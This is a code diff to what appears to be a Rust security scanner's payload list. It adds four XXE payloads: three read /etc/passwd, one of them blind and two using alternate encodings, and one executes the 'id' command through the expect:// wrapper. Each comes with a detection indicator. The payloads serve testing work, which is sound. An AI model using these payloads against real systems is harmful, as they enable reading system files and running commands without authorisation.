@@ -43,5 +43,37 @@ pub fn get_payloads() -> Vec<PayloadDefinition> {
             severity: SeverityLevel::Critical,
             safe_for_production: true,
         },
+        PayloadDefinition {
+            id: "xxe_06".into(),
+            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]><foo>test</foo>"#.into(),
+            description: "Parameter Entity XXE (Blind)".into(),
+            expected_indicator: ExpectedIndicator::ErrorPattern("failed to load external entity".into()),
+            severity: SeverityLevel::Critical,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "xxe_07".into(),
+            payload: r#"<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.into(),
+            description: "XXE with alternate encoding (ISO-8859-1)".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::Critical,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "xxe_08".into(),
+            payload: r#"<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.into(),
+            description: "XXE with alternate encoding (UTF-16)".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::Critical,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "xxe_09".into(),
+            payload: r#"<!DOCTYPE xxe [<!ELEMENT name ANY><!ENTITY xxe SYSTEM "expect://id">]><name>&xxe;</name>"#.into(),
+            description: "XXE RCE via expect wrapper".into(),
+            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
+            severity: SeverityLevel::Critical,
+            safe_for_production: false,
+        }
     ]
 }
